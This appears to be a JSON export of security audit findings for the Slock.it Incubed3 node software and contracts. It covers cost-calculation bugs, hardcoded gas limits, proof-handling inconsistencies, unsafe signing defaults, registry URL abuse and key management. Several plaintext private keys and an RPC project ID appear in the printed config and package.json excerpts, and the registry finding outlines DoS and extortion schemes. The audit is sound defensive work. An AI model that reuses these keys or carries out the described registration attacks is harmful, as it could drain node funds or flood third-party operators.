      "content": "#### Resolution\n\n\n\nMitigated by [502b5528](https://git.slock.it/in3/ts/in3-server/commit/502b55289f6802862635b073e2a567f76b4f2ec1) by falling back to using the current block in case `searchForAvailableBlock` returns `0`. Costs can be zero, but cannot be negative anymore.\n\n\nThe behaviour of the IN3-server code is outside the [scope of this audit](#audit-scope). However, while verifying the fixes for this specific issue it was observed that the `watch.ts:handleConvict()` relies on a static hardcoded cost calculation. We further note that the cost calculation formula has an error and is missing parentheses to avoid that costs can be zero. We did not see a reason for the costs not to be allowed to be zero. Furthermore, costs are calculated based on the difference of the conviction block to the latest block. Actual recreation costs can be less if there is an available block in blockhashRegistry to recreate it from that is other than the latest block.\n\n\n\n\n#### Description\n\n\nA node that wants to convict another node for false proof must update the `BlockhashRegistry` for signatures provided in blocks older than the most recent 256 blocks. Only when the smart contract is able to verify that the signed blockhash is wrong the convicting node will be able to receive half of its deposit.\n\n\nThe `in3-server` implements an automated mechanism to recreate blockhashes. It first searches for an existing blockhash within a range of blocks. If one is found and it is profitable (gas spend vs. amount awarded) the node will try to recreate the blockchain updating the registry.\n\n\n* The call to `searchForAvailableBlock` might return `0` (default) because no block is actually found within the range, this will cause `costs` to be negative and the code will proceed trying to convict the node even though it cannot work.\n* The call to `searchForAvailableBlock` might also return the convict block number (`latestSS==s.block`) in which case costs will be `0` and the code will still proceed trying to recreate the blockheaders and convict the node.\n\n\n**code/in3-server/src/chains/signatures.ts:L207-L231**\n\n\n\n```\nconst [, deposit, , , , , , ,] = await callContract(handler.config.rpcUrl, nodes.contract, 'nodes(uint):(string,uint,uint64,uint64,uint128,uint64,address,bytes32)', [toNumber(singingNode.index)])\nconst latestSS = toNumber((await callContract(handler.config.rpcUrl, blockHashRegistry, 'searchForAvailableBlock(uint,uint):(uint)', [s.block, diffBlocks]))[0])\nconst costPerBlock = 86412400000000\nconst blocksMissing = latestSS - s.block\nconst costs = blocksMissing \\* costPerBlock \\* 1.25\n\nif (costs > (deposit / 2)) {\n\n  console.log(\"not worth it\")\n  //it's not worth it\n  return\n}\nelse {\n\n  // it's worth convicting the server\n  const blockrequest = []\n  for (let i = 0; i < blocksMissing; i++) {\n    blockrequest.push({\n      jsonrpc: '2.0',\n      id: i + 1,\n      method: 'eth\\_getBlockByNumber', params: [\n        toHex(latestSS - i), false\n      ]\n    })\n  }\n\n```\nPlease note that certain parts of the code rely on hardcoded gas values. Gas economics might change with future versions of the evm and have to be re-validated with every version. It is also good practice to provide inline comments about how and on what base certain values were selected.\n\n\n#### Recommendation\n\n\nVerify that the call succeeds and returns valid values. Check if the block already exists in the `BlockhashRegistry` and avoid recreation. Also note that `searchForAvailableBlock` can wrap with values close to `uint_max` even though that is unlikely to happen. In general, return values for external calls should be validated more rigorously.",
      "summary": "\nThis bug report is about an issue with the IN3-server code. It was observed that the `watch.ts:handleConvict()` relies on a static hardcoded cost calculation that has an error and is missing parentheses to avoid that costs can be zero. The issue is that a node that wants to convict another node for false proof must update the `BlockhashRegistry` for signatures provided in blocks older than the most recent 256 blocks. The `in3-server` implements an automated mechanism to recreate blockhashes, but the call to `searchForAvailableBlock` might return `0` or the convict block number, which will cause costs to be negative or zero, respectively. This could cause the code to proceed trying to convict the node even though it cannot work.\n\nThe issue was mitigated by falling back to using the current block in case `searchForAvailableBlock` returns `0`. Costs can be zero, but cannot be negative anymore. However, certain parts of the code still rely on hardcoded gas values. It is recommended to verify that the call succeeds and returns valid values, check if the block already exists in the `BlockhashRegistry` and avoid recreation, and to return values for external calls more rigorously. It is also recommended to provide inline comments about how and on what base certain values were selected.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Slock.it Incubed3",
      "source_link": "https://consensys.net/diligence/audits/2019/09/slock.it-incubed3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13968",
      "title": "in3-server - hardcoded gas limit could result in failed transactions/requests âœ“Â Fixed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nFixed by using web3 `eth_estimateGas` in [merge\\_requests/109](https://git.slock.it/in3/ts/in3-server/merge_requests/109) to dynamically price the gas according to the network state.\n\n\n#### Description\n\n\nThere are many instances of hardcoded gas limit in `in3-server` that depending on the complexity of the transaction or gas cost changes in Ethereum could result in failed transactions.\n\n\n#### Examples\n\n\n`convict()`:\n\n\n**code/in3-server/src/chains/signatures.ts:L132-L137**\n\n\n\n```\nawait callContract(handler.config.rpcUrl, nodes.contract, 'convict(uint,bytes32)', [s.block, convictSignature], {\n  privateKey: handler.config.privateKey,\n  gas: 500000,\n  value: 0,\n  confirm: true                       // we are not waiting for confirmation, since we want to deliver the answer to the client.\n})\n\n```\n`recreateBlockheaders()`:\n\n\n**code/in3-server/src/chains/signatures.ts:L275-L280**\n\n\n\n```\nawait callContract(handler.config.rpcUrl, blockHashRegistry, 'recreateBlockheaders(uint,bytes[])', [latestSS - diffBlock, txArray], {\n  privateKey: handler.config.privateKey,\n  gas: 8000000,\n  value: 0,\n  confirm: true                       // we are not waiting for confirmation, since we want to deliver the answer to the client.\n})\n\n```\nOther instances of hard coded gasLimit or gasPrice:\n\n\n**code/in3-server/src/modules/eth/EthHandler.ts:L78-L79**\n\n\n\n```\n  if (!tx || (tx.gas && toNumber(tx.gas) > 10000000)) throw new Error('eth\\_call with a gaslimit > 10M are not allowed')\n}\n\n```\n#### Recommendation\n\n\nUse web3 gas estimate instead. To be sure, there can be an additional gas added to the estimated value or `max(HARDCODED_GAS, estimated_amount)`",
      "summary": "\nA bug was discovered in the in3-server codebase where hardcoded gas limits were used in transactions. This could potentially lead to failed transactions depending on the complexity of the transaction or changes in Ethereum gas costs. Examples of hardcoded gas limits were found in the `convict()` and `recreateBlockheaders()` functions in the code/in3-server/src/chains/signatures.ts file, as well as in code/in3-server/src/modules/eth/EthHandler.ts file. The bug was fixed by using web3 `eth_estimateGas` in [merge_requests/109](https://git.slock.it/in3/ts/in3-server/merge_requests/109) to dynamically price the gas according to the network state. This ensures that the gas limit is properly estimated according to the current network state, and can also be supplemented with an additional gas amount or the maximum of the hardcoded gas and the estimated amount.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Slock.it Incubed3",
      "source_link": "https://consensys.net/diligence/audits/2019/09/slock.it-incubed3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13967",
      "title": "in3-server - rpc proof handler specification inconsistency âœ“Â Fixed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nAddressed with <https://git.slock.it/in3/ts/in3-server/issues/100>. Checks for `proof` and `proofWithSignature` are more strict now, `never` is not checked and assumed to be the default. Falling back to no security as a default is not considered best practice. `signatures` has been renamed to the more accurate name `signers`. The client now allows both `signers` and `signatures` and we suggest already to start planning to phase-out this ambiguity, strictly enforce the specified protocol and reduce special cases and complexity in future iterations.\n\n\n#### Description\n\n\nAccording to the [specification](https://in3.readthedocs.io/en/develop/spec.html#incubed-requests) incubed requests must specify whether they want to have a proof or not. There are three variants of proofs that can be requested:\n\n\n* `never` - no proof appended\n* `proof` - proof but no signed blockhashes\n* `proofWithSignature`- proof and a request to sign blockhashes from the list of addresses provided in `signatures`.\n\n\nNote that the name `signatures` for the array of signers a blockhash signature is requested from is misleading. It is actually signer addresses as listed in the `NodeRegistry` and not signatures.\n\n\nFollowing the `in3-server` we found at least one inconsistency (and suspect more) with the proof requested by a client. The graceful check for the existence of something starting with `proof` will pass `proof` and `proofWithSignature` but also any other `proofXYZ` to the blockproof handler.\n\n\n**code/in3-server/src/modules/eth/EthHandler.ts:L106-L112**\n\n\n\n```\nif (request.in3.verification.startsWith('proof'))\n  switch (request.method) {\n    case 'eth\\_getBlockByNumber':\n    case 'eth\\_getBlockByHash':\n    case 'eth\\_getBlockTransactionCountByHash':\n    case 'eth\\_getBlockTransactionCountByNumber':\n      return handleBlock(this, request)\n\n```\nFollowing through `handleBlock` we cannot find any check for `proofWithSignature`. The string is not found in the whole codebase which also suggests it is not tested. However, the code assumes that because `request.in3.signatures` is not empty, signatures were requested. This is inconsistent with the specification and a protocol violation.\n\n\n**code/in3-server/src/modules/eth/proof.ts:L237-L244**\n\n\n\n```\n// create the proof\nresponse.in3 = {\n  proof: {\n    type: 'blockProof',\n    signatures: await collectSignatures(handler, request.in3.signatures, [{ blockNumber: toNumber(blockData.number), hash: blockData.hash }], request.in3.verifiedHashes)\n  }\n}\n\n\n```\nThe same is valid for all other types of proofs. `proofWithSignature` is never checked and it is assumed that `proofWithSignature` was requested just because `request.in3.signatures` is present non-empty.\n\n\nThe same is true for â€˜neverâ€™ which is actually never handled in code.\n\n\n#### Recommendation\n\n\nThe protocol should be strictly enforced without allowing any ambiguities and unsharpness. Ambiguities and gracefulness in the protocol can lead to severe inconsistencies and encourage client authors to not strictly adhere to the protocol. This makes it hard to update and maintain the protocol in the future and may allow potential attackers enough freedom to exploit the protocol. Furthermore the specification must be kept up-to-date at all times. The specification is to lead development and code must always be verified against the specification.",
      "summary": "\nA bug report was submitted regarding the inconsistency between the proof requested by a client and what is handled by the in3-server code. The code allows for any string starting with \"proof\" to pass to the blockproof handler, but does not check for \"proofWithSignature\". This is a violation of the protocol and the specification must be kept up-to-date. The report recommends that the protocol should be strictly enforced without allowing any ambiguities or unsharpness, and that the specification should lead development. To address the issue, checks for \"proof\" and \"proofWithSignature\" are now more strict and \"never\" is assumed to be the default. The client now allows both \"signers\" and \"signatures\" and developers are suggested to phase-out the ambiguity and reduce special cases and complexity in future iterations.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Slock.it Incubed3",
      "source_link": "https://consensys.net/diligence/audits/2019/09/slock.it-incubed3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13966",
      "title": "in3-server - should enforce safe settings for minBlockHeight Â Won't Fix",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nThe default block is changed to 10 and `minBlockHeight` is added to the registry\n(as part of the properties) in [8c72633e](https://git.slock.it/in3/ts/in3-server/commit/8c72633e53651bb4dc2b0d6627ce6c238dd3e2e8), but allow the user to define a `minBlockHeight` lower than this number. The client is responsible to review the settings depending on how secure they want their nodes to be.\n\n\nClient response:\n\n\n\n> \n> We have discussed this, but decided to keep it flexible. This means:\n> \n> \n> 1. We have put the minBlockHeight into the registry (as part of the properties). Because these properties indicate the limit and capabilities of the node and give the client a chance to filter out nodes if they donâ€™t match the requirements. So each client is able to filter out node who are not willing to take the risk and sign for example latest-6. Of course these nodes will most likely only store a low deposit ( you can not have a signature of a young block and a high deposit), but if you need a high security the nodes with a deposit will propably wait at least 10 or more blocks. In order to protect the owner of a node of using insecure settings, we will use our wizard to check the deposit and minBlockHeights and warn or educate the user. The reason why this flexibility is important, is because there use cases where dapps will not accept the let user wait 10 blocks before confirming a transaction. If the dapp developer needs a signature of a younger block, he will need to live with the fact, that he wonâ€™t be able to find a high deposit to secure it.\n> 2. We also changed the default to 10 blocks, but allow the user to define a minBlockHeight lower than this number. In this case the node would write a warning in the logfile, but still accepts the user configuration. This allows to use incubed also on different chains other than the mainnet.\n> 3. The `safeMinBlockHeight` is now dependend on different chains, which is one single function, so we donâ€™t have hardcoded values in different places anymore.\n> \n> \n> \n\n\n\n\n#### Description\n\n\nA node that is signing wrong blockhashes might get their deposit slashed from the registry. The entity that is convicting a node that signs a wrong blockhash is awarded half of the deposit.\n\n\nA threat to this kind of system is that blocks might constantly be reorganized in the chain, especially with the latest block. Allowing a node to sign the latest block will definitely put the nodeâ€™s deposit at stake with every signature they provide.\n\n\nA node can configure the `minBlockHeight` it is about to sign with a configurative option. The option defaults to a `minBlockHeight` of `6` in the default config:\n\n\n**code/in3-server/src/server/config.ts:L32-L32**\n\n\n\n```\nminBlockHeight: 6,\n\n```\nAnd again in the signing function for blockheaders:\n\n\n**code/in3-server/src/chains/signatures.ts:L189-L189**\n\n\n\n```\nconst blockHeight = handler.config.minBlockHeight === undefined ? 6 : handler.config.minBlockHeight\n\n```\n`handleSign` will refuse to sign any block that is within the last 5 blocks. The `6`th block will be signed.\n\n\n**code/in3-server/src/chains/signatures.ts:L190-L193**\n\n\n\n```\nconst tooYoungBlock = blockData.find(block => toNumber(blockNumber) - toNumber(block.number) < blockHeight)\nif (tooYoungBlock)\n  throw new Error(' cannot sign for block ' + tooYoungBlock.number + ', because the blockHeight must be at least ' + blockHeight)\n\n\n```\nHowever, a user is not prevented from configuring an insecure `minBlockHeight` (e.g. `0`) which will very likely lead to the loss of funds because the node will be signing the latest block.\n\n\nThe current default of `6` blocks leads to an approximate lag of `14 (avg blocktime) *6 (blocks) = 84 seconds`. While this is a favorable setting because it allows nodes to provide signatures for blocks that are at least older than 6 blocks it might still not be secure. For example, CryptoExchange [Kraken](https://support.kraken.com/hc/en-us/articles/203325283-Cryptocurrency-deposit-processing-times) requires at least 30 confirmation (abt. 6 minutes) until a transaction is confirmed. For Bitcoin it is said to be safe to wait more than 6 blocks (abt. 1 hr) for a transaction to be confirmed. ETC even underwent a [deep chain reorg](https://blog.coinbase.com/ethereum-classic-etc-is-currently-being-51-attacked-33be13ce32de) that could have caused many nodes to lose their deposits. The [ethereum whitepaper](https://github.com/ethereum/wiki/wiki/White-Paper#modified-ghost-implementation) defines an uncle that can be referenced in a block to have the following property: `It must be a direct child of the k-th generation ancestor of B, where 2 <= k <= 7.` This suggests that `k=7`â€˜th block can at least still be an uncle. [Bitfinex](https://support.bitfinex.com/hc/en-us/articles/115003291405-Where-is-my-cryptocurrency-deposit-or-withdrawal-) requires a minimum of 10 confirmations. Some blockchain explorers and analytics tools also require a minimum of 10 confirmations. Scraped data from <https://etherscan.io/blocks_forked?ps=100> shows 3 forks of depth 3 since they started keeping records 115 days ago, and no forks deeper than 3. So some applications might legitimately pick a number somewhere between 5 and 20, trading some security for better UX. However, it should be re-evaluated whether the current default provides enough security to protect the nodes funds with a trade-off of lag to the network.\n\n\nGiven these values it is suggested to revalidate the default of a `minBlockHeight` of 6 in favor of a more secure depth to make sure that - with a default setting - nodes will not lose funds in case of re-orgs.\n\n\n#### Recommendation\n\n\n* `config.minBlockHeight` should always be set to a sane value when loading the configuration. There should be no need to reset it to a hardcoded default value of 6 in `handleSign`. Do not hardcode the values in various places in the config.\n* normalize and sanitize the settings to make sure that after loading they are always valid and within reasonable bounds. the application should refuse to run with a `minBlockHeader` set to `0` as this is a guarantee for losing funds. Other nodes can enumerate nodes that are misconfigured (e.g. with `minBlockHeight` being `0`) to request signatures just to convict them on micro-forks.\n* assume a secure default setting for every chain (note that this might be different for every chain). allow to override the value by the user. warn the user of less secure settings and do not allow to set settings that are obviously leading to the loss of funds.\n* re-evaluate the `minBlockHeight` of 6 for the ethereum blockchain and choose a koservative secure default.",
      "summary": "\nThis bug report discusses the issue of a node signing wrong blockhashes and potentially losing their deposit. The node is able to configure the `minBlockHeight` it is about to sign with a configurative option, which defaults to a `minBlockHeight` of `6` in the default config. This allows the node to provide signatures for blocks that are at least older than 6 blocks, but it might still not be secure enough. It is suggested to revalidate the default of a `minBlockHeight` of 6 in favor of a more secure depth to make sure that nodes will not lose funds in case of re-orgs. The report recommends that the `config.minBlockHeight` should always be set to a sane value when loading the configuration, normalize and sanitize the settings to make sure that after loading they are always valid and within reasonable bounds, assume a secure default setting for every chain, allow to override the value by the user, and warn the user of less secure settings.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Slock.it Incubed3",
      "source_link": "https://consensys.net/diligence/audits/2019/09/slock.it-incubed3/",
      "github_link": "",
      "tags": [
        "Chain Reorganization Attack"
      ],
      "finders": [
        "Martin Ortner",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13965",
      "title": "NodeRegistry - Multiple nodes can share slightly different RPC URL âœ“Â Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nSame mitigation as [issue 6.4](#noderegistry---url-can-be-arbitrary-dns-resolvable-names-ips-and-even-localhost-or-private-subnets).\n\n\n#### Description\n\n\nOne of the requirements for Node registration is to have a unique URL which is not already used by a different owner. The uniqueness check is done by hashing the provided `_url` and checking if someone already registered with that hash of `_url`.\n\n\nHowever, byte-equality checks (via hashing in this case) to enforce uniqueness will not work for URLs. For example, while the following URLs are not equal and will result in different `urlHashes` they can logically be the same end-point:\n\n\n* `https://some-server.com/in3-rpc`\n* `https://some-server.com:443/in3-rpc`\n* `https://some-server.com/in3-rpc/`\n* `https://some-server.com/in3-rpc///`\n* `https://some-server.com/in3-rpc?something`\n* `https://some-server.com/in3-rpc?something&something`\n* `https://www.some-server.com/in3-rpc?something` (if www resolves to the same ip)\n\n\n**code/in3-contracts/contracts/NodeRegistry.sol:L547-L553**\n\n\n\n```\nbytes32 urlHash = keccak256(bytes(\\_url));\n\n// make sure this url and also this owner was not registered before.\n// solium-disable-next-line\nrequire(!urlIndex[urlHash].used && signerIndex[\\_signer].stage == Stages.NotInUse,\n    \"a node with the same url or signer is already registered\");\n\n\n```\nThis leads to the following attack vectors:\n\n\n* A user signs up multiple nodes that resolve to the same end-point (URL). A minimum deposit of `0.01 ether` is required for each registration. Registering multiple nodes for the same end-point might allow an attacker to increase their chance of being picked to provide proofs. Registering multiple nodes requires unique signer addresses per node.\n* Also one node can have multiple accounts, hence one node can have slightly different URL and different accounts as the `signer`s.\n* DoS - A user might register nodes for URLs that do not serve in3-clients in an attempt to DDoS e.g. in an attempt to extort web-site operators. This is kind of a reflection attack where nodes will request other nodes from the contract and try to contact them over RPC. Since it is http-rpc it will consume resources on the receiving end.\n* DoS - A user might register Nodes with RPC URLs of other nodes, manipulating weights to cause more traffic than the node can actually handle. Nodes will try to communicate with that node. If no proof is requested the node will not even know that someone else signed up other nodes with their RPC URL to cause problems. If they request proof the original signer will return a signed proof and the node will fail due to a signature mismatch. However, *the node cannot be convicted* and therefore forced to lose the deposit as conviction is bound the signer and the block was not signed by the rogue node entry. There will be no way to remove the node from the registry other than the admin functionality.\n\n\n#### Recommendation\n\n\nCanonicalize URLs, but that will not completely prevent someone from registering nodes for other end-points or websites. Nodes can be removed by an admin in the first year but not after that. Rogue owners cannot be prevented from registering random nodes with high weights and minimum deposit. They cannot be convicted as they do not serve proofs. Rogue owners can still unregister to receive their deposit after messing with the system.",
      "summary": "\nThis bug report is about the Node Registry in the IN3-contracts. It describes an attack vector in which a user can register multiple nodes with the same URL, allowing them to increase their chance of being picked to provide proofs. It also mentions how a user can register multiple accounts for the same node, or register nodes with URLs that do not serve IN3-clients in an attempt to DDoS and extort web-site operators. The report also suggests that canonicalizing URLs can help prevent this attack, however it will not completely prevent someone from registering nodes for other end-points or websites. The report recommends that nodes can be removed by an admin in the first year, but not after that, and that rogue owners cannot be prevented from registering random nodes with high weights and minimum deposit, but can still unregister to receive their deposit after messing with the system.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Slock.it Incubed3",
      "source_link": "https://consensys.net/diligence/audits/2019/09/slock.it-incubed3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13964",
      "title": "in3-server - key management Â Pending",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nThe breakdown of the fixes addressed with [git.slock.it/PR/13](https://git.slock.it/in3/ts/in3-server/merge_requests/113) are as follows:\n\n\n\n> \n> * Keys should never be stored or accepted in plaintext format\n> Keys should only be accepted in an encrypted and protected format\n> \n> \n> \n\n\nThe private key in `code/in3-server/config.json` has been removed.\nThe repository still contains private keys at least in the following locations:\n\n\n* `package.json`\n* `vscode/launch.json`\n* `example_docker-compose.yml`\n\n\nNote that private keys indexed by a git repository can be restored from the repository history.\n\n\nThe following statement has been provided to address this issue:\n\n\n\n> \n> We have removed all examples and usage of plain private keys and replaced them with json-keystore files. Also in the documentation we added warnings on how to deal with keys, especially with hints to the bash history or enviroment\n> \n> \n> \n\n\n\n\n---\n\n\n\n> \n> * A single key should be used for only one purpose. Keys should not be shared.\n> \n> \n> \n\n\nThe following statement has been provided to address this issue:\n\n\n\n> \n> This is why we seperated the owner and signer-key. This way you can use a multisig to securly protect the owner-key. The signer-key is used to sign blocks (and convict) and is not able to do anything else (not even changing its own url)\n> \n> \n> \n\n\n\n\n---\n\n\n\n> \n> * The application should support developers in understanding where cryptographic keys are stored within the application as well as in which memory regions they might be accessible for other applications\n> \n> \n> \n\n\nAddressed by wrapping the private key in an object that stores the key in encrypted form and only decrypts it when signing. The key is cleared after usage. The IN3-server still allows raw private keys to be configured. A warning is printed if that is the case. The loaded raw private key is temporarily assigned to a local variable and not explicitly cleared by the method.\n\n\n\n> \n> While we used to keep the unlocked key as part of the config, we have now removed the key from the config and store them in a special signer-function.  \n> \n> <https://git.slock.it/in3/ts/in3-server/merge_requests/113>\n> \n> \n> \n\n\n\n\n---\n\n\n\n> \n> * Keys should be protected in memory and only decrypted for the duration of time they are actively used. Keys should not be stored with the applications source-code repository\n> \n> \n> \n\n\nsee previous remediation note.\n\n\n\n> \n> After unlocking the signer key, we encrypt it again and keep it encrypted only decrypting it when signing. This way the raw private key only exist for a very short time in memory and will be filled with 0 right after. ( <https://git.slock.it/in3/ts/in3-server/merge_requests/113/diffs#653b04fa41e35b55181776b9f14620b661cff64c_54_73> )\n> \n> \n> \n\n\n\n\n---\n\n\n\n> \n> * Use standard libraries for cryptographic operations\n> \n> \n> \n\n\nThe following statement has been provided to address this issue\n\n\n\n> \n> We are using ethereumjs-libs.\n> \n> \n> \n\n\n\n\n---\n\n\n\n> \n> * Use the system keystore and API to sign and avoid to store key material at all\n> \n> \n> \n\n\nThe following statement has been provided to address this issue\n\n\n\n> \n> We are looking into using different signer-apis, even supporting hardware-modules like HSMs. But this may happen in future releases.\n> \n> \n> \n\n\n\n\n---\n\n\n\n> \n> * The application should store the keys eth-address (util.getAddress()) instead of re-calculating it multiple times from the private key.\n> \n> \n> \n\n\nFixed by generating the address for a private key once and storing it in a private key wrapper object.\n\n\n\n\n---\n\n\n\n> \n> * Do not leak credentials and key material in debug-mode, to local log-output or external log aggregators.\n> \n> \n> \n\n\n`txArgs` still contains a field `privateKey` as outlined in the issue description. However, this `privateKey` now represents the wrapper object noted in a previous comment which only provides access to the ETH address generated from the raw private key.\n\n\nThe following statement has been provided to address this issue:\n\n\n\n> \n> since the private key and the passphrase are actually deleted from the config, logoutputs or even debug will not be able to leak this information.\n> \n> \n> \n\n\n\n\n#### Description\n\n\nSecure and efficient key management is a challenge for any cryptographic system. Incubed nodes for example require an account on the ethereum blockchain to actively participate in the incubed network. The account and therefore a private-key is used to sign transactions on the ethereum blockchain and to provide signed proofs to other in3-nodes.\n\n\nThis means that an attacker that is able to discover the keys used by an `in3-server` by any mechanism may be able to impersonate that node, steal the nodes funds or sign wrong data on behalf of the node which might also lead to a loss of funds.\n\n\nThe private key for the `in3-server` can be specified in a configuration file called `config.json` residing in the program working dir. Settings from the `config.json` can be overridden via command-line options. The application keeps configuration parameters available internally in an `IN3RPCConfig` object and passes this object as an initialization parameter to other objects.\n\n\nThe key can either be provided in plaintext as a hex-string starting with `0x` or within an ethereum keystore format compatible protected keystore file. Either way it is provided it will be held in plaintext in the object.\n\n\nThe application accepts plaintext private keys and the keys are stored unprotected in the applications memory in JavaScript objects. The `in3-server` might even re-use the nodes private key which may weaken the security provided by the node. The repository leaks a series of presumably â€˜test private keysâ€™ and the default config file already comes with a private key set that might be shared across unvary users that fail to override it.\n\n\n**code/in3-server/config.json:L1-L4**\n\n\n\n```\n{\n  \"privateKey\": \"0xc858a0f49ce12df65031ba0eb0b353abc74f93f8ccd43df9682fd2e2293a4db3\",\n  \"rpcUrl\": \"http://rpc-kovan.slock.it\"\n}\n\n```\n**code/in3-server/package.json:L20-L31**\n\n\n\n```\n\"docker-run\": \"docker run -p 8500:8500 docker.slock.it/slockit/in3-server:latest --privateKey=0x3858a0f49ce12df65031ba0eb0b353abc74f93f8ccd43df9682fd2e2293a4db3 --chain=0x2a --rpcUrl=https://kovan.infura.io/HVtVmCIHVgqHGUgihfhX --minBlockHeight=6 --registry=0x013b82355a066A31427df3140C5326cdE9c64e3A --persistentFile=false --logging-host=logs7.papertrailapp.com --logging-name=Papertrail --logging-port=30571 --logging-type=winston-papertrail\",\n\"docker-setup\": \"docker run -p 8500:8500 slockit/in3-server:latest --privateKey=0x3858a0f49ce12df65031ba0eb0b353abc74f93f8ccd43df9682fd2e2293a4db3 --chain=0x2a --rpcUrl=https://kovan.infura.io/HVtVmCIHVgqHGUgihfhX --minBlockHeight=6 --registry=0x013b82355a066A31427df3140C5326cdE9c64e3A --persistentFile=false --autoRegistry-url=https://in3.slock.it/kovan1 --autoRegistry-capabilities-proof=true --autoRegistry-capabilities-multiChain=true --autoRegistry-deposit=1\",\n\"local\": \"export NODE\\_ENV=0 && npm run build && node ./js/src/server/server.js --privateKey=0xD231FCF9349A296F555A060A619235F88650BBA795E5907CFD7F5442876250E4 --chain=0x2a --rpcUrl=https://rpc.slock.it/kovan --minBlockHeight=6 --registry=0x27a37a1210df14f7e058393d026e2fb53b7cf8c1 --persistentFile=false\",\n\"ipfs\": \"docker run -d -p 5001:5001 jbenet/go-ipfs daemon --offline\",\n\"linkIn3\": \"cd node\\_modules; rm -rf in3; ln -s ../../in3 in3; cd ..\",\n\"lint:solium\": \"node node\\_modules/ethlint/bin/solium.js -d contracts/\",\n\"lint:solium:fix\": \"node node\\_modules/ethlint/bin/solium.js -d contracts/ --fix\",\n\"lint:solhint\": \"node node\\_modules/solhint/solhint.js \\\"contracts/\\*\\*/\\*.sol\\\" -w 0\",\n\"local-env\": \"export NODE\\_ENV=0 && npm run build && node ./js/src/server/server.js --privateKey=0x9e53e6933d69a28a737943e227ad013c7489e366f33281d350c77f089d8411a6 --chain=0x111 --rpcUrl=http://localhost:8545 --minBlockHeight=6 --registry=0x31636f91297C14A8f1E7Ac271f17947D6A5cE098 --persistentFile=false --autoRegistry-url=http://127.0.0.1:8500 --autoRegistry-capabilities-proof=true --autoRegistry-capabilities-multiChain=true --autoRegistry-deposit=0\",\n\"local-env2\": \"export NODE\\_ENV=0 && npm run build && node ./js/src/server/server.js --privateKey=0xf7db260e6edcdfe396d75f8283aad5aed835815f7d1db4458896310553a8a1a9 --chain=0x111 --rpcUrl=http://localhost:8545 --minBlockHeight=6 --registry=0x31636f91297C14A8f1E7Ac271f17947D6A5cE098 --persistentFile=false --autoRegistry-url=http://127.0.0.1:8501 --autoRegistry-capabilities-proof=true --autoRegistry-capabilities-multiChain=true --autoRegistry-deposit=0\",\n\"local-env3\": \"export NODE\\_ENV=0 && npm run build && node ./js/src/server/server.js --privateKey=0xf7db260e6edcdfe396d75f8283aad5aed835815f7d1db4458896310553a8a1a9 --chain=0x5 --rpcUrl=https://rpc.slock.it/goerli --minBlockHeight=6 --registry=0x85613723dB1Bc29f332A37EeF10b61F8a4225c7e --persistentFile=false\",\n\"local-env4\": \"export NODE\\_ENV=0 && npm run build && node ./js/src/server/server.js --privateKey=0xf7db260e6edcdfe396d75f8283aad5aed835815f7d1db4458896310553a8a1a9 --chain=0x2a --rpcUrl=https://rpc.slock.it/kovan --minBlockHeight=6 --registry=0x27a37a1210df14f7e058393d026e2fb53b7cf8c1 --persistentFile=false\"\n\n```\nThe private key is also passed as arguments to other functions. In error cases these may leak the private key to log interfaces or remote log aggregation instances (sentry). See `txargs.privateKey` in the example below:\n\n\n**code/in3-server/src/util/tx.ts:L100-L100**\n\n\n\n```\nconst key = toBuffer(txargs.privateKey)\n\n```\n**code/in3-server/src/util/tx.ts:L134-L140**\n\n\n\n```\nconst txHash = await transport.handle(url, {\n  jsonrpc: '2.0',\n  id: idCount++,\n  method: 'eth\\_sendRawTransaction',\n  params: [toHex(tx.serialize())]\n}).then((\\_: RPCResponse) => \\_.error ? Promise.reject(new SentryError('Error sending tx', 'tx\\_error', 'Error sending the tx ' + JSON.stringify(txargs) + ':' + JSON.stringify(\\_.error))) as any : \\_.result + '')\n\n\n```\n#### Recommendation\n\n\n* Keys should never be stored or accepted in plaintext format.\n\t+ Keys should not be stored in plaintext on the file-system as they might easily be exposed to other users. Credentials on the file-system must be tightly restricted by access control.\n\t+ Keys should not be provided as plaintext via environment variables as this might make them available to other processes sharing the same environment (child-processes, e.g. same shell session)\n\t+ Keys should not be provided as plaintext via command-line arguments as they might persist in the shellâ€™s command history or might be available to privileged system accounts that can query other processes startup parameters.\n* Keys should only be accepted in an encrypted and protected format.\n* A single key should be used for only one purpose. Keys should not be shared.\n\t+ The use of the same key for two different cryptographic processes may weaken the security provided by one or both of the processes.\n\t+ The use of the same key for two different applications may weaken the security provided by one or both of the applications.\n\t+ Limiting the use of a key limits the damage that could be done if the key is compromised.\n\t+ Node owners keys should not be re-used as signer keys.\n* The application should support developers in understanding where cryptographic keys are stored within the application as well as in which memory regions they might be accessible for other applications.\n* Keys should be protected in memory and only decrypted for the duration of time they are actively used.\n* Keys should not be stored with the applications source-code repository.\n* Use standard libraries for cryptographic operations.\n* Use the system keystore and API to sign and avoid to store key material at all.\n* The application should store the keys eth-address (`util.getAddress()`) instead of re-calculating it multiple times from the private key.\n* Do not leak credentials and key material in debug-mode, to local log-output or external log aggregators.",
